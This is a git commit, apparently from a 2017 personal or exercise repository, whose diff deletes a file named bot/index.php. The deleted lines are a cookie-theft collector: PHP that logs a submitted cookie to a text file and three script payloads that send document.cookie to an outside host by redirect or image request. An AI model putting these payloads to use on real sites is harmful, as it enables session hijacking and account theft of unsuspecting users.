fdf6ca75f1c5d9ec132e3cd8d8dfd8c74f324fd6
albic <albic@sfc.wide.ad.jp>
2017-07-18 22:00:02 +0900

    余計なファイル削除

--- bot/index.php
+++
@@ -1,9 +0,0 @@
-<?php
-$cookie = $_COOKIE['key'];
-$file = fopen('coookie.txt','a');
-fwrite($file,$cookie . "\n\n");
-?>
-
- <script>window.location.href= "http://albic.sakura.ne.jp/cookie/"</script>
-<script>window.location.href = "http://albic.sakura.ne.jp/cookie?"+document.cookie;</script>
-<script>new Image().src="http://albic.sakura.ne.jp/cookie?"+document.cookie</script>
